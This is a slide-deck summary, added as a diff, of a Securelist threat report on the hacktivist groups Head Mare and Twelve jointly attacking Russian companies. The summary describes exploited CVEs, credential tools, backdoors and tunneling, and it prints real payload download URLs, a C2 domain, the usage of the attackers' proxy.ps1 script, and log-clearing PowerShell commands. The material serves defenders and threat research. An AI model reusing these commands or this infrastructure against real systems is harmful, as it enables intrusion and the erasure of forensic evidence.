@@ -1,0 +1,137 @@
+https://securelist.com/head-mare-twelve-collaboration/115887/
+
+Slide 1: Overview & Context
+Title: Head Mare and Twelve – Joint Attacks on Russian Entities
+Publication Date: 13 March 2025
+Focus:
+Collaboration between two hacktivist groups
+Targeting Russian companies using both established and new techniques
+Integration of PowerShell-based tools alongside publicly available and leaked malware
+Slide 2: Timeline of Operations
+August 2024:
+Introduction of PhantomJitter Backdoor:
+– New remote command execution tool added to the attackers’ arsenal
+September 2024:
+Attack Wave Against Russian Companies:
+– Multiple incidents reveal overlapping indicators of compromise (IOCs)
+– Evidence suggests sharing of tactics and tools between Head Mare and Twelve
+Post-September 2024:
+Method Refinement:
+– Expanded access vectors (phishing, compromised contractors, RDP)
+– Enhanced persistence and pivoting techniques to bypass defenses
+(Reference: )
+
+Slide 3: Exploited Vulnerabilities & Initial Access
+Software Vulnerabilities:
+WinRAR Vulnerability (CVE-2023-38831):
+– Exploited via phishing emails carrying malicious attachments
+Microsoft Exchange ProxyLogon (CVE-2021-26855):
+– Despite patches, outdated systems remain vulnerable
+– Enables attackers to execute remote commands (e.g., download the CobInt backdoor)
+Additional Techniques:
+Compromised Trusted Relationships:
+– Infiltration through contractors with access to business automation platforms
+– Exploitation of exposed RDP connections
+Key Takeaway:
+– Attackers diversify entry points to maximize access chances.
+Slide 4: Detailed Methods & Technical Techniques
+Tool Integration & Malware:
+Legacy Tools:
+– mimikatz, ADRecon, secretsdump, ProcDump, PSExec, smbexec, wmiexec, etc.
+New & Shared Tools:
+– CobInt Backdoor: Previously seen in Twelve’s attacks; now leveraged by Head Mare
+– PhantomJitter Backdoor: Introduced in August 2024 for remote command execution
+Initial Access Approaches:
+Phishing & Social Engineering:
+– Use of malicious attachments exploiting WinRAR vulnerabilities
+Exploitation of Vulnerabilities:
+– Utilizing ProxyLogon to download malicious payloads
+Persistence Mechanisms:
+Creation of New Privileged Users:
+– On business automation servers to maintain remote access
+Installation of Tunneling Tools:
+– Deploying Localtonet via NSSM to ensure services remain active
+Pivoting:
+– Employing custom PowerShell scripts to install and configure tunneling utilities (Gost, cloudflared) that allow the attackers to bypass network restrictions
+Slide 5: Code & Automation – PowerShell Scripts in Action
+Proxy Script (proxy.ps1):
+Purpose:
+– Download and extract remote archives
+– Install tunneling tools as Windows services
+Key Parameters:
+– -r for remote archive download, -p for setting port, -t for cloudflared token, and -u for uninstallation
+Snippet Highlights:
+powershell
+Copy
+Usage: .\proxy.ps1 -r https://<site>.com/archive.zip -p gost_port -t cloudflared_token
+Parameters:
+  -l       Extract archive locally.
+  -r       Download and extract archive remotely.
+  -p       Specify the port for the gost.
+  -t       Specify the token for the cloudflared.
+  -u       Uninstall gost & cloudflared.
+  -h       Show help message.
+Service Installation Functions:
+Setup-Gost-Service:
+– Reads and modifies an XML configuration to update port settings
+– Installs and starts Gost as a service
+Setup-Cloudflared-Service:
+– Automates the installation of cloudflared as a Windows service
+– Configures it using parameters provided at runtime
+Automation Benefits:
+– Enables stealthy deployment and removal of malware artifacts
+– Facilitates rapid pivoting and remote control through standardized service management
+Slide 6: Command & Control (C2) and Network Pivoting
+C2 Infrastructure:
+PhantomJitter Backdoor:
+– Downloads from URLs such as http://45.87.246.34:443/calc.exe and http://185.158.248.107:443/calc.exe
+– Establishes a direct connection for executing remote commands
+CobInt Backdoor:
+– Connects to C2 servers via domains like 360nvidia.com
+Pivoting Techniques:
+Use of Tunneling Tools:
+– Gost: Sets up secure, flexible network proxies
+– Cloudflared: Tunnels traffic via the Cloudflare network to bypass firewalls and NAT
+– Localtonet: Provides reverse proxy capabilities ensuring persistent access
+Custom Script Functionality:
+– The proxy.ps1 script simplifies the setup of these tools, ensuring seamless pivoting across compromised networks
+Slide 7: Anti-Detection & Stealth Techniques
+Masquerading:
+Renaming Executables:
+– Malicious binaries are given names of legitimate system files (e.g., wusa.exe, winuac.exe, winsw.exe)
+Example:
+– cmd.exe renamed to log.exe to hide its true function
+Log Clearing & Service Removal:
+PowerShell Commands to Clear Traces:
+powershell
+Copy
+stop-service -name <servicename>
+remove-service -name <servicename>
+sc stop <servicename>
+sc delete <servicename>
+Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
+Rationale:
+– Prevents forensic detection by erasing evidence of malicious activities
+Artifact Removal:
+– The proxy script also includes commands to uninstall services and delete associated files and logs, thereby erasing its footprint after execution
+Slide 8: Impact on Organizations & Final Considerations
+Target Profile:
+Russian Companies:
+– Particularly those using outdated systems such as Microsoft Exchange 2016 and Windows Server 2012 R2
+Business Automation Platforms:
+– Exploited through compromised contractors and vulnerable RDP endpoints
+Broader Consequences:
+Security & Financial Risk:
+– Even without precise numbers, the scale suggests a significant threat to critical infrastructures
+Operational Disruption:
+– The use of ransomware elements (e.g., LockBit 3.0, Babuk) alongside data exfiltration indicates potential for high-impact financial and operational losses
+Final Thought:
+– The collaboration between Head Mare and Twelve, along with their evolving toolset and methods, underscores the importance of timely patch management, continuous monitoring, and layered security strategies to mitigate such advanced threats.
+Slide 9: Conclusion
+Evolving Threat Landscape:
+– Hacktivist groups are increasingly merging tactics and sharing tools, making detection and defense more challenging.
+Defense Imperative:
+– Organizations must address legacy vulnerabilities, monitor for anomalous network activity, and employ robust incident response strategies.
+Further Reading:
+– For an in-depth understanding, refer to the full Securelist report.
+(Reference: )
